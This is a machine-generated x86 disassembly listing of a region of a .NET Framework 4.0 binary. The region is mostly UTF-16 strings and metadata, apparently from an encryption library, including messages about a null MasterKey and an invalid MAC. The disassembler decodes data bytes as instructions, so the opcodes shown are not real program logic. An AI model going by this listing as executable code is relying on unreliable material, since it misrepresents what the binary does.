  40bc62:	00 72 00             	add    %dh,0x0(%edx)
  40bc65:	00 47 6d             	add    %al,0x6d(%edi)
  40bc68:	00 61 00             	add    %ah,0x0(%ecx)
  40bc6b:	73 00                	jae    0x40bc6d
  40bc6d:	74 00                	je     0x40bc6f
  40bc6f:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40bc73:	4b                   	dec    %ebx
  40bc74:	00 65 00             	add    %ah,0x0(%ebp)
  40bc77:	79 00                	jns    0x40bc79
  40bc79:	20 00                	and    %al,(%eax)
  40bc7b:	63 00                	arpl   %eax,(%eax)
  40bc7d:	61                   	popa
  40bc7e:	00 6e 00             	add    %ch,0x0(%esi)
  40bc81:	20 00                	and    %al,(%eax)
  40bc83:	6e                   	outsb  %ds:(%esi),(%dx)
  40bc84:	00 6f 00             	add    %ch,0x0(%edi)
  40bc87:	74 00                	je     0x40bc89
  40bc89:	20 00                	and    %al,(%eax)
  40bc8b:	62 00                	bound  %eax,(%eax)
  40bc8d:	65 00 20             	add    %ah,%gs:(%eax)
  40bc90:	00 6e 00             	add    %ch,0x0(%esi)
  40bc93:	75 00                	jne    0x40bc95
  40bc95:	6c                   	insb   (%dx),%es:(%edi)
  40bc96:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  40bc9a:	00 6f 00             	add    %ch,0x0(%edi)
  40bc9d:	72 00                	jb     0x40bc9f
  40bc9f:	20 00                	and    %al,(%eax)
  40bca1:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40bca5:	70 00                	jo     0x40bca7
  40bca7:	74 00                	je     0x40bca9
  40bca9:	79 00                	jns    0x40bcab
  40bcab:	2e 00 00             	add    %al,%cs:(%eax)
  40bcae:	2d 69 00 6e 00       	sub    $0x6e0069,%eax
  40bcb3:	70 00                	jo     0x40bcb5
  40bcb5:	75 00                	jne    0x40bcb7
  40bcb7:	74 00                	je     0x40bcb9
  40bcb9:	20 00                	and    %al,(%eax)
  40bcbb:	63 00                	arpl   %eax,(%eax)
  40bcbd:	61                   	popa
  40bcbe:	00 6e 00             	add    %ch,0x0(%esi)
  40bcc1:	20 00                	and    %al,(%eax)
  40bcc3:	6e                   	outsb  %ds:(%esi),(%dx)
  40bcc4:	00 6f 00             	add    %ch,0x0(%edi)
  40bcc7:	74 00                	je     0x40bcc9
  40bcc9:	20 00                	and    %al,(%eax)
  40bccb:	62 00                	bound  %eax,(%eax)
  40bccd:	65 00 20             	add    %ah,%gs:(%eax)
  40bcd0:	00 6e 00             	add    %ch,0x0(%esi)
  40bcd3:	75 00                	jne    0x40bcd5
  40bcd5:	6c                   	insb   (%dx),%es:(%edi)
  40bcd6:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40bcda:	00 00                	add    %al,(%eax)
  40bcdc:	55                   	push   %ebp
  40bcdd:	49                   	dec    %ecx
  40bcde:	00 6e 00             	add    %ch,0x0(%esi)
  40bce1:	76 00                	jbe    0x40bce3
  40bce3:	61                   	popa
  40bce4:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40bce8:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  40bcec:	00 6d 00             	add    %ch,0x0(%ebp)
  40bcef:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40bcf3:	73 00                	jae    0x40bcf5
  40bcf5:	61                   	popa
  40bcf6:	00 67 00             	add    %ah,0x0(%edi)
  40bcf9:	65 00 20             	add    %ah,%gs:(%eax)
  40bcfc:	00 61 00             	add    %ah,0x0(%ecx)
  40bcff:	75 00                	jne    0x40bd01
  40bd01:	74 00                	je     0x40bd03
  40bd03:	68 00 65 00 6e       	push   $0x6e006500
  40bd08:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40bd0c:	00 63 00             	add    %ah,0x0(%ebx)
  40bd0f:	61                   	popa
  40bd10:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40bd14:	00 6f 00             	add    %ch,0x0(%edi)
  40bd17:	6e                   	outsb  %ds:(%esi),(%dx)
  40bd18:	00 20                	add    %ah,(%eax)
  40bd1a:	00 63 00             	add    %ah,0x0(%ebx)
  40bd1d:	6f                   	outsl  %ds:(%esi),(%dx)
  40bd1e:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40bd22:	00 20                	add    %ah,(%eax)
  40bd24:	00 28                	add    %ch,(%eax)
  40bd26:	00 4d 00             	add    %cl,0x0(%ebp)
  40bd29:	41                   	inc    %ecx
  40bd2a:	00 43 00             	add    %al,0x0(%ebx)
  40bd2d:	29 00                	sub    %eax,(%eax)
  40bd2f:	2e 00 00             	add    %al,%cs:(%eax)
  40bd32:	05 58 00 32 00       	add    $0x320058,%eax
  40bd37:	00 0f                	add    %cl,(%edi)
  40bd39:	7b 00                	jnp    0x40bd3b
  40bd3b:	30 00                	xor    %al,(%eax)
  40bd3d:	3a 00                	cmp    (%eax),%al
  40bd3f:	44                   	inc    %esp
  40bd40:	00 33                	add    %dh,(%ebx)
  40bd42:	00 7d 00             	add    %bh,0x0(%ebp)
  40bd45:	20 00                	and    %al,(%eax)
  40bd47:	00 0f                	add    %cl,(%edi)
  40bd49:	7b 00                	jnp    0x40bd4b
  40bd4b:	30 00                	xor    %al,(%eax)
  40bd4d:	3a 00                	cmp    (%eax),%al
  40bd4f:	58                   	pop    %eax
  40bd50:	00 32                	add    %dh,(%edx)
  40bd52:	00 7d 00             	add    %bh,0x0(%ebp)
  40bd55:	20 00                	and    %al,(%eax)
  40bd57:	00 2b                	add    %ch,(%ebx)
  40bd59:	28 00                	sub    %al,(%eax)
  40bd5b:	6e                   	outsb  %ds:(%esi),(%dx)
  40bd5c:	00 65 00             	add    %ah,0x0(%ebp)
  40bd5f:	76 00                	jbe    0x40bd61
  40bd61:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40bd65:	20 00                	and    %al,(%eax)
  40bd67:	75 00                	jne    0x40bd69
  40bd69:	73 00                	jae    0x40bd6b
  40bd6b:	65 00 64 00 29       	add    %ah,%gs:0x29(%eax,%eax,1)
  40bd70:	00 20                	add    %ah,(%eax)
  40bd72:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  40bd76:	00 70 00             	add    %dh,0x0(%eax)
  40bd79:	65 00 20             	add    %ah,%gs:(%eax)
  40bd7c:	00 24 00             	add    %ah,(%eax,%eax,1)
  40bd7f:	63 00                	arpl   %eax,(%eax)
  40bd81:	31 00                	xor    %eax,(%eax)
  40bd83:	00 45 28             	add    %al,0x28(%ebp)
  40bd86:	00 65 00             	add    %ah,0x0(%ebp)
  40bd89:	78 00                	js     0x40bd8b
  40bd8b:	74 00                	je     0x40bd8d
  40bd8d:	38 00                	cmp    %al,(%eax)
  40bd8f:	2c 00                	sub    $0x0,%al
  40bd91:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40bd95:	74 00                	je     0x40bd97
  40bd97:	31 00                	xor    %eax,(%eax)
  40bd99:	36 00 2c 00          	add    %ch,%ss:(%eax,%eax,1)
  40bd9d:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40bda1:	33 00                	xor    (%eax),%eax
  40bda3:	32 00                	xor    (%eax),%al
  40bda5:	29 00                	sub    %eax,(%eax)
  40bda7:	20 00                	and    %al,(%eax)
  40bda9:	74 00                	je     0x40bdab
  40bdab:	79 00                	jns    0x40bdad
  40bdad:	70 00                	jo     0x40bdaf
  40bdaf:	65 00 20             	add    %ah,%gs:(%eax)
  40bdb2:	00 24 00             	add    %ah,(%eax,%eax,1)
  40bdb5:	63 00                	arpl   %eax,(%eax)
  40bdb7:	37                   	aaa
  40bdb8:	00 2c 00             	add    %ch,(%eax,%eax,1)
  40bdbb:	24 00                	and    $0x0,%al
  40bdbd:	63 00                	arpl   %eax,(%eax)
  40bdbf:	38 00                	cmp    %al,(%eax)
  40bdc1:	2c 00                	sub    $0x0,%al
  40bdc3:	24 00                	and    $0x0,%al
  40bdc5:	63 00                	arpl   %eax,(%eax)
  40bdc7:	39 00                	cmp    %eax,(%eax)
  40bdc9:	00 00                	add    %al,(%eax)
  40bdcb:	00 ad 81 9c a1 a7    	add    %ch,-0x585e637f(%ebp)
  40bdd1:	dc 42 49             	faddl  0x49(%edx)
  40bdd4:	ad                   	lods   %ds:(%esi),%eax
  40bdd5:	7b c0                	jnp    0x40bd97
  40bdd7:	d7                   	xlat   %ds:(%ebx)
  40bdd8:	3f                   	aas
  40bdd9:	66 74 31             	data16 je 0x40be0d
  40bddc:	00 08                	add    %cl,(%eax)
  40bdde:	b7 7a                	mov    $0x7a,%bh
  40bde0:	5c                   	pop    %esp
  40bde1:	56                   	push   %esi
  40bde2:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  40bde5:	89 03                	mov    %eax,(%ebx)
  40bde7:	00 00                	add    %al,(%eax)
  40bde9:	01 03                	add    %eax,(%ebx)
  40bdeb:	20 00                	and    %al,(%eax)
  40bded:	01 02                	add    %eax,(%edx)
  40bdef:	06                   	push   %es
  40bdf0:	0e                   	push   %cs
  40bdf1:	03 06                	add    (%esi),%eax
  40bdf3:	12 09                	adc    (%ecx),%cl
  40bdf5:	03 06                	add    (%esi),%eax
  40bdf7:	12 44 03 00          	adc    0x0(%ebx,%eax,1),%al
  40bdfb:	00 02                	add    %al,(%edx)
  40bdfd:	03 06                	add    (%esi),%eax
  40bdff:	12 0d 03 06 12 11    	adc    0x11120603,%cl
  40be05:	03 06                	add    (%esi),%eax
  40be07:	1d 05 02 06 0a       	sbb    $0xa060205,%eax
  40be0c:	03 06                	add    (%esi),%eax
  40be0e:	12 15 02 06 02 02    	adc    0x2020602,%dl
  40be14:	06                   	push   %es
  40be15:	1c 02                	sbb    $0x2,%al
  40be17:	06                   	push   %es
  40be18:	08 04 00             	or     %al,(%eax,%eax,1)
  40be1b:	00 12                	add    %dl,(%edx)
  40be1d:	0d 05 00 01 01       	or     $0x1010005,%eax
  40be22:	12 0d 04 00 00 12    	adc    0x12000004,%cl
  40be28:	11 05 00 01 01 12    	adc    %eax,0x12010100
  40be2e:	11 04 00             	adc    %eax,(%eax,%eax,1)
  40be31:	00 1d 05 05 00 01    	add    %bl,0x1000505
  40be37:	01 1d 05 03 00 00    	add    %ebx,0x305
  40be3d:	0a 04 00             	or     (%eax,%eax,1),%al
  40be40:	01 01                	add    %eax,(%ecx)
  40be42:	0a 04 00             	or     (%eax,%eax,1),%al
  40be45:	00 12                	add    %dl,(%edx)
  40be47:	15 05 00 01 01       	adc    $0x1010005,%eax
  40be4c:	12 15 04 00 01 01    	adc    0x1010004,%dl
  40be52:	02 03                	add    (%ebx),%al
  40be54:	00 00                	add    %al,(%eax)
  40be56:	1c 03                	sbb    $0x3,%al
  40be58:	00 00                	add    %al,(%eax)
  40be5a:	08 04 00             	or     %al,(%eax,%eax,1)
  40be5d:	01 01                	add    %eax,(%ecx)
  40be5f:	08 04 00             	or     %al,(%eax,%eax,1)
  40be62:	01 02                	add    %eax,(%edx)
  40be64:	0e                   	push   %cs
  40be65:	0a 00                	or     (%eax),%al
  40be67:	04 02                	add    $0x2,%al
  40be69:	1c 12                	sbb    $0x12,%al
  40be6b:	19 12                	sbb    %edx,(%edx)
  40be6d:	1d 11 21 05 00       	sbb    $0x52111,%eax
  40be72:	01 01                	add    %eax,(%ecx)
  40be74:	12 25 04 00 01 01    	adc    0x1010004,%ah
  40be7a:	1c 04                	sbb    $0x4,%al
  40be7c:	08 00                	or     %al,(%eax)
  40be7e:	12 0d 04 08 00 12    	adc    0x12000804,%cl
  40be84:	11 04 08             	adc    %eax,(%eax,%ecx,1)
  40be87:	00 1d 05 03 08 00    	add    %bl,0x80305
  40be8d:	0a 04 08             	or     (%eax,%ecx,1),%al
  40be90:	00 12                	add    %dl,(%edx)
  40be92:	15 03 08 00 02       	adc    $0x2000803,%eax
  40be97:	03 08                	add    (%eax),%ecx
  40be99:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40be9c:	08 00                	or     %al,(%eax)
  40be9e:	08 03                	or     %al,(%ebx)
  40bea0:	00 00                	add    %al,(%eax)
  40bea2:	0e                   	push   %cs
  40bea3:	04 00                	add    $0x0,%al
  40bea5:	01 0e                	add    %ecx,(%esi)
  40bea7:	0e                   	push   %cs
  40bea8:	08 b0 3f 5f 7f 11    	or     %dh,0x117f5f3f(%eax)
  40beae:	d5 0a                	aad    $0xa
  40beb0:	3a 06                	cmp    (%esi),%al
  40beb2:	00 01                	add    %al,(%ecx)
  40beb4:	12 29                	adc    (%ecx),%ch
  40beb6:	12 2d 03 06 12 31    	adc    0x31120603,%ch
  40bebc:	03 00                	add    (%eax),%eax
  40bebe:	00 18                	add    %bl,(%eax)
  40bec0:	07                   	pop    %es
  40bec1:	00 03                	add    %al,(%ebx)
  40bec3:	08 18                	or     %bl,(%eax)
  40bec5:	12 35 08 04 00 01    	adc    0x1000408,%dh
  40becb:	18 0e                	sbb    %cl,(%esi)
  40becd:	06                   	push   %es
  40bece:	00 02                	add    %al,(%edx)
  40bed0:	02 18                	add    (%eax),%bl
  40bed2:	10 02                	adc    %al,(%edx)
  40bed4:	06                   	push   %es
  40bed5:	00 01                	add    %al,(%ecx)
  40bed7:	11 30                	adc    %esi,(%eax)
  40bed9:	11 30                	adc    %esi,(%eax)
  40bedb:	06                   	push   %es
  40bedc:	00 03                	add    %al,(%ebx)
  40bede:	01 09                	add    %ecx,(%ecx)
  40bee0:	09 09                	or     %ecx,(%ecx)
  40bee2:	02 06                	add    (%esi),%al
  40bee4:	09 03                	or     %eax,(%ebx)
  40bee6:	06                   	push   %es
  40bee7:	11 30                	adc    %esi,(%eax)
  40bee9:	04 00                	add    $0x0,%al
  40beeb:	00 00                	add    %al,(%eax)
  40beed:	80 04 02 00          	addb   $0x0,(%edx,%eax,1)
  40bef1:	00 00                	add    %al,(%eax)
  40bef3:	04 01                	add    $0x1,%al
  40bef5:	00 00                	add    %al,(%eax)
  40bef7:	00 06                	add    %al,(%esi)
  40bef9:	00 02                	add    %al,(%edx)
  40befb:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40befe:	3d 06 00 02 02       	cmp    $0x2020006,%eax
  40bf03:	0e                   	push   %cs
  40bf04:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  40bf09:	1d 05 0e 07 06       	sbb    $0x6070e05,%eax
  40bf0e:	15 12 41 01 12       	adc    $0x12014112,%eax
  40bf13:	60                   	pusha
  40bf14:	05 00 01 01 12       	add    $0x12010100,%eax
  40bf19:	60                   	pusha
  40bf1a:	04 00                	add    $0x0,%al
  40bf1c:	01 01                	add    %eax,(%ecx)
  40bf1e:	0e                   	push   %cs
  40bf1f:	18 06                	sbb    %al,(%esi)
  40bf21:	15 12 45 01 15       	adc    $0x15014512,%eax
  40bf26:	12 49 0a             	adc    0xa(%ecx),%cl
  40bf29:	12 4d 1c             	adc    0x1c(%ebp),%cl
  40bf2c:	12 0d 12 09 0e 1d    	adc    0x1d0e0912,%cl
  40bf32:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40bf37:	0e                   	push   %cs
  40bf38:	04 20                	add    $0x20,%al
  40bf3a:	00 00                	add    %al,(%eax)
  40bf3c:	00 04 40             	add    %al,(%eax,%eax,2)
  40bf3f:	00 00                	add    %al,(%eax)
  40bf41:	00 04 10             	add    %al,(%eax,%edx,1)
  40bf44:	00 00                	add    %al,(%eax)
  40bf46:	00 04 20             	add    %al,(%eax,%eiz,1)
  40bf49:	01 01                	add    %eax,(%ecx)
  40bf4b:	0e                   	push   %cs
  40bf4c:	04 20                	add    $0x20,%al
  40bf4e:	01 0e                	add    %ecx,(%esi)
  40bf50:	0e                   	push   %cs
  40bf51:	06                   	push   %es
  40bf52:	20 01                	and    %al,(%ecx)
  40bf54:	1d 05 1d 05 07       	sbb    $0x7051d05,%eax
  40bf59:	20 02                	and    %al,(%edx)
  40bf5b:	02 1d 05 1d 05 06    	add    0x6051d05,%bl
  40bf61:	00 01                	add    %al,(%ecx)
  40bf63:	1d 05 1d 05 03       	sbb    $0x3051d05,%eax
  40bf68:	06                   	push   %es
  40bf69:	11 50 03             	adc    %edx,0x3(%eax)
  40bf6c:	06                   	push   %es
  40bf6d:	12 55 05             	adc    0x5(%ebp),%dl
  40bf70:	00 01                	add    %al,(%ecx)
  40bf72:	0e                   	push   %cs
  40bf73:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  40bf78:	1d 05 0a 05 00       	sbb    $0x50a05,%eax
  40bf7d:	01 1d 05 08 05 00    	add    %ebx,0x50805
  40bf83:	01 1d 05 06 05 00    	add    %ebx,0x50605
  40bf89:	01 1d 05 0d 09 20    	add    %ebx,0x20090d05
  40bf8f:	01 01                	add    %eax,(%ecx)
  40bf91:	15 12 41 01 12       	adc    $0x12014112,%eax
  40bf96:	60                   	pusha
  40bf97:	03 20                	add    (%eax),%esp
  40bf99:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40bf9c:	20 00                	and    %al,(%eax)
  40bf9e:	02 03                	add    (%ebx),%al
  40bfa0:	28 00                	sub    %al,(%eax)
  40bfa2:	1c 03                	sbb    $0x3,%al
  40bfa4:	06                   	push   %es
  40bfa5:	12 60 0b             	adc    0xb(%eax),%ah
  40bfa8:	20 02                	and    %al,(%edx)
  40bfaa:	01 12                	add    %edx,(%edx)
  40bfac:	60                   	pusha
  40bfad:	15 12 41 01 12       	adc    $0x12014112,%eax
  40bfb2:	60                   	pusha
  40bfb3:	04 20                	add    $0x20,%al
  40bfb5:	00 12                	add    %dl,(%edx)
  40bfb7:	60                   	pusha
  40bfb8:	05 20 01 12 60       	add    $0x60120120,%eax
  40bfbd:	0e                   	push   %cs
  40bfbe:	05 20 01 12 60       	add    $0x60120120,%eax
  40bfc3:	0a 05 20 01 12 60    	or     0x60120120,%al
  40bfc9:	0d 05 20 01 12       	or     $0x12012005,%eax
  40bfce:	60                   	pusha
  40bfcf:	08 03                	or     %al,(%ebx)
  40bfd1:	20 00                	and    %al,(%eax)
  40bfd3:	08 05 28 01 12 60    	or     %al,0x60120128
  40bfd9:	08 03                	or     %al,(%ebx)
  40bfdb:	28 00                	sub    %al,(%eax)
  40bfdd:	08 03                	or     %al,(%ebx)
  40bfdf:	06                   	push   %es
  40bfe0:	11 64 03 06          	adc    %esp,0x6(%ebx,%eax,1)
  40bfe4:	12 5c 04 20          	adc    0x20(%esp,%eax,1),%bl
  40bfe8:	01 08                	add    %ecx,(%eax)
  40bfea:	0e                   	push   %cs
  40bfeb:	05 20 01 01 12       	add    $0x12010120,%eax
  40bff0:	61                   	popa
  40bff1:	04 20                	add    $0x20,%al
  40bff3:	01 01                	add    %eax,(%ecx)
  40bff5:	0a 04 20             	or     (%eax,%eiz,1),%al
  40bff8:	01 01                	add    %eax,(%ecx)
  40bffa:	0b 03                	or     (%ebx),%eax
  40bffc:	20 00                	and    %al,(%eax)
  40bffe:	0b 03                	or     (%ebx),%eax
  40c000:	20 00                	and    %al,(%eax)
  40c002:	0a 03                	or     (%ebx),%al
  40c004:	20 00                	and    %al,(%eax)
  40c006:	0d 05 20 01 01       	or     $0x1012005,%eax
  40c00b:	1d 05 04 20 00       	sbb    $0x200405,%eax
  40c010:	1d 05 05 20 02       	sbb    $0x2200505,%eax
  40c015:	01 0e                	add    %ecx,(%esi)
  40c017:	0e                   	push   %cs
  40c018:	05 20 02 01 0e       	add    $0xe010220,%eax
  40c01d:	08 04 20             	or     %al,(%eax,%eiz,1)
  40c020:	01 02                	add    %eax,(%edx)
  40c022:	0e                   	push   %cs
  40c023:	03 20                	add    (%eax),%esp
  40c025:	00 0e                	add    %cl,(%esi)
  40c027:	04 20                	add    $0x20,%al
  40c029:	01 01                	add    %eax,(%ecx)
  40c02b:	02 04 20             	add    (%eax,%eiz,1),%al
  40c02e:	01 01                	add    %eax,(%ecx)
  40c030:	0c 04                	or     $0x4,%al
  40c032:	20 01                	and    %al,(%ecx)
  40c034:	01 0d 04 20 00 12    	add    %ecx,0x12002004
  40c03a:	5c                   	pop    %esp
  40c03b:	04 20                	add    $0x20,%al
  40c03d:	00 11                	add    %dl,(%ecx)
  40c03f:	64 04 20             	fs add $0x20,%al
  40c042:	00 12                	add    %dl,(%edx)
  40c044:	59                   	pop    %ecx
  40c045:	03 28                	add    (%eax),%ebp
  40c047:	00 0e                	add    %cl,(%esi)
  40c049:	03 28                	add    (%eax),%ebp
  40c04b:	00 0a                	add    %cl,(%edx)
  40c04d:	03 28                	add    (%eax),%ebp
  40c04f:	00 0d 04 28 00 12    	add    %cl,0x12002804
  40c055:	5c                   	pop    %esp
  40c056:	04 28                	add    $0x28,%al
  40c058:	00 11                	add    %dl,(%ecx)
  40c05a:	64 04 00             	fs add $0x0,%al
  40c05d:	00 00                	add    %al,(%eax)
  40c05f:	00 04 03             	add    %al,(%ebx,%eax,1)
  40c062:	00 00                	add    %al,(%eax)
  40c064:	00 04 04             	add    %al,(%esp,%eax,1)
  40c067:	00 00                	add    %al,(%eax)
  40c069:	00 04 05 00 00 00 04 	add    %al,0x4000000(,%eax,1)
  40c070:	06                   	push   %es
  40c071:	00 00                	add    %al,(%eax)
  40c073:	00 04 07             	add    %al,(%edi,%eax,1)
  40c076:	00 00                	add    %al,(%eax)
  40c078:	00 04 08             	add    %al,(%eax,%ecx,1)
  40c07b:	00 00                	add    %al,(%eax)
  40c07d:	00 04 09             	add    %al,(%ecx,%ecx,1)
  40c080:	00 00                	add    %al,(%eax)
  40c082:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40c085:	00 00                	add    %al,(%eax)
  40c087:	00 04 0b             	add    %al,(%ebx,%ecx,1)
  40c08a:	00 00                	add    %al,(%eax)
  40c08c:	00 06                	add    %al,(%esi)
  40c08e:	00 02                	add    %al,(%edx)
  40c090:	0e                   	push   %cs
  40c091:	12 61 08             	adc    0x8(%ecx),%ah
  40c094:	05 00 01 0e 12       	add    $0x120e0100,%eax
  40c099:	61                   	popa
  40c09a:	06                   	push   %es
  40c09b:	00 02                	add    %al,(%edx)
  40c09d:	0e                   	push   %cs
  40c09e:	05 12 61 05 00       	add    $0x56112,%eax
  40c0a3:	01 01                	add    %eax,(%ecx)
  40c0a5:	12 61 06             	adc    0x6(%ecx),%ah
  40c0a8:	00 02                	add    %al,(%edx)
  40c0aa:	01 12                	add    %edx,(%edx)
  40c0ac:	61                   	popa
  40c0ad:	0e                   	push   %cs
  40c0ae:	07                   	pop    %es
  40c0af:	00 02                	add    %al,(%edx)
  40c0b1:	01 12                	add    %edx,(%edx)
  40c0b3:	61                   	popa
  40c0b4:	1d 05 06 00 02       	sbb    $0x2000605,%eax
  40c0b9:	01 12                	add    %edx,(%edx)
  40c0bb:	61                   	popa
  40c0bc:	0d 06 00 02 01       	or     $0x1020006,%eax
  40c0c1:	12 61 0c             	adc    0xc(%ecx),%ah
  40c0c4:	06                   	push   %es
  40c0c5:	00 02                	add    %al,(%edx)
  40c0c7:	01 12                	add    %edx,(%edx)
  40c0c9:	61                   	popa
  40c0ca:	02 06                	add    (%esi),%al
  40c0cc:	00 02                	add    %al,(%edx)
  40c0ce:	01 12                	add    %edx,(%edx)
  40c0d0:	61                   	popa
  40c0d1:	0b 06                	or     (%esi),%eax
  40c0d3:	00 02                	add    %al,(%edx)
  40c0d5:	01 12                	add    %edx,(%edx)
  40c0d7:	61                   	popa
  40c0d8:	0a 03                	or     (%ebx),%al
  40c0da:	06                   	push   %es
  40c0db:	11 78 04             	adc    %edi,0x4(%eax)
  40c0de:	20 01                	and    %al,(%ecx)
  40c0e0:	01 08                	add    %ecx,(%eax)
  40c0e2:	08 01                	or     %al,(%ecx)
  40c0e4:	00 08                	add    %cl,(%eax)
  40c0e6:	00 00                	add    %al,(%eax)
  40c0e8:	00 00                	add    %al,(%eax)
  40c0ea:	00 1e                	add    %bl,(%esi)
  40c0ec:	01 00                	add    %eax,(%eax)
  40c0ee:	01 00                	add    %eax,(%eax)
  40c0f0:	54                   	push   %esp
  40c0f1:	02 16                	add    (%esi),%dl
  40c0f3:	57                   	push   %edi
  40c0f4:	72 61                	jb     0x40c157
  40c0f6:	70 4e                	jo     0x40c146
  40c0f8:	6f                   	outsl  %ds:(%esi),(%dx)
  40c0f9:	6e                   	outsb  %ds:(%esi),(%dx)
  40c0fa:	45                   	inc    %ebp
  40c0fb:	78 63                	js     0x40c160
  40c0fd:	65 70 74             	gs jo  0x40c174
  40c100:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  40c107:	77 73                	ja     0x40c17c
  40c109:	01 05 20 01 01 11    	add    %eax,0x11010120
  40c10f:	71 08                	jno    0x40c119
  40c111:	01 00                	add    %eax,(%eax)
  40c113:	02 00                	add    (%eax),%al
  40c115:	00 00                	add    %al,(%eax)
  40c117:	00 00                	add    %al,(%eax)
  40c119:	05 01 00 00 00       	add    $0x1,%eax
  40c11e:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40c121:	00 07                	add    %al,(%edi)
  40c123:	31 2e                	xor    %ebp,(%esi)
  40c125:	30 2e                	xor    %ch,(%esi)
  40c127:	30 2e                	xor    %ch,(%esi)
  40c129:	30 00                	xor    %al,(%eax)
  40c12b:	00 65 01             	add    %ah,0x1(%ebp)
  40c12e:	00 29                	add    %ch,(%ecx)
  40c130:	2e 4e                	cs dec %esi
  40c132:	45                   	inc    %ebp
  40c133:	54                   	push   %esp
  40c134:	46                   	inc    %esi
  40c135:	72 61                	jb     0x40c198
  40c137:	6d                   	insl   (%dx),%es:(%edi)
  40c138:	65 77 6f             	gs ja  0x40c1aa
  40c13b:	72 6b                	jb     0x40c1a8
  40c13d:	2c 56                	sub    $0x56,%al
  40c13f:	65 72 73             	gs jb  0x40c1b5
  40c142:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  40c149:	30 2c 50             	xor    %ch,(%eax,%edx,2)
  40c14c:	72 6f                	jb     0x40c1bd
  40c14e:	66 69 6c 65 3d 43 6c 	imul   $0x6c43,0x3d(%ebp,%eiz,2),%bp
  40c155:	69 65 6e 74 01 00 54 	imul   $0x54000174,0x6e(%ebp),%esp
  40c15c:	0e                   	push   %cs
  40c15d:	14 46                	adc    $0x46,%al
  40c15f:	72 61                	jb     0x40c1c2
  40c161:	6d                   	insl   (%dx),%es:(%edi)
  40c162:	65 77 6f             	gs ja  0x40c1d4
  40c165:	72 6b                	jb     0x40c1d2
  40c167:	44                   	inc    %esp
  40c168:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  40c16f:	61                   	popa
  40c170:	6d                   	insl   (%dx),%es:(%edi)
  40c171:	65 1f                	gs pop %ds
  40c173:	2e 4e                	cs dec %esi
  40c175:	45                   	inc    %ebp
  40c176:	54                   	push   %esp
  40c177:	20 46 72             	and    %al,0x72(%esi)
  40c17a:	61                   	popa
  40c17b:	6d                   	insl   (%dx),%es:(%edi)
  40c17c:	65 77 6f             	gs ja  0x40c1ee
  40c17f:	72 6b                	jb     0x40c1ec
  40c181:	20 34 20             	and    %dh,(%eax,%eiz,1)
  40c184:	43                   	inc    %ebx
  40c185:	6c                   	insb   (%dx),%es:(%edi)
  40c186:	69 65 6e 74 20 50 72 	imul   $0x72502074,0x6e(%ebp),%esp
  40c18d:	6f                   	outsl  %ds:(%esi),(%dx)
  40c18e:	66 69 6c 65 09 01 00 	imul   $0x1,0x9(%ebp,%eiz,2),%bp
  40c195:	04 49                	add    $0x49,%al
  40c197:	74 65                	je     0x40c1fe
  40c199:	6d                   	insl   (%dx),%es:(%edi)
  40c19a:	00 00                	add    %al,(%eax)
  40c19c:	03 07                	add    (%edi),%eax
  40c19e:	01 08                	add    %ecx,(%eax)
  40c1a0:	04 00                	add    $0x0,%al
  40c1a2:	01 08                	add    %ecx,(%eax)
  40c1a4:	0e                   	push   %cs
  40c1a5:	03 07                	add    (%edi),%eax
  40c1a7:	01 02                	add    %eax,(%edx)
  40c1a9:	05 00 00 12 80       	add    $0x80120000,%eax
  40c1ae:	b1 05                	mov    $0x5,%cl
  40c1b0:	20 01                	and    %al,(%ecx)
  40c1b2:	0e                   	push   %cs
  40c1b3:	1d 05 05 20 00       	sbb    $0x200505,%eax
  40c1b8:	12 80 b5 05 20 00    	adc    0x2005b5(%eax),%al
  40c1be:	12 80 b9 05 20 01    	adc    0x12005b9(%eax),%al
  40c1c4:	1d 05 0e 08 20       	sbb    $0x20080e05,%eax
  40c1c9:	03 02                	add    (%edx),%eax
  40c1cb:	1d 05 0e 1d 05       	sbb    $0x51d0e05,%eax
  40c1d0:	14 07                	adc    $0x7,%al
  40c1d2:	08 0e                	or     %cl,(%esi)
  40c1d4:	08 1d 12 80 c9 08    	or     %bl,0x8c98012
  40c1da:	12 80 c9 12 80 cd    	adc    -0x327fed37(%eax),%al
  40c1e0:	12 80 d1 1d 0e 0c    	adc    0xc0e1dd1(%eax),%al
  40c1e6:	20 03                	and    %al,(%ebx)
  40c1e8:	01 11                	add    %edx,(%ecx)
  40c1ea:	80 d5 11             	adc    $0x11,%ch
  40c1ed:	80 d9 11             	sbb    $0x11,%cl
  40c1f0:	80 dd 05             	sbb    $0x5,%ch
  40c1f3:	00 02                	add    %al,(%edx)
  40c1f5:	02 0e                	add    (%esi),%cl
  40c1f7:	0e                   	push   %cs
  40c1f8:	06                   	push   %es
  40c1f9:	20 01                	and    %al,(%ecx)
  40c1fb:	1d 0e 1d 03 04       	sbb    $0x4031d0e,%eax
  40c200:	20 01                	and    %al,(%ecx)
  40c202:	08 08                	or     %cl,(%eax)
  40c204:	07                   	pop    %es
  40c205:	00 01                	add    %al,(%ecx)
  40c207:	1d 12 80 c9 0e       	sbb    $0xec98012,%eax
  40c20c:	07                   	pop    %es
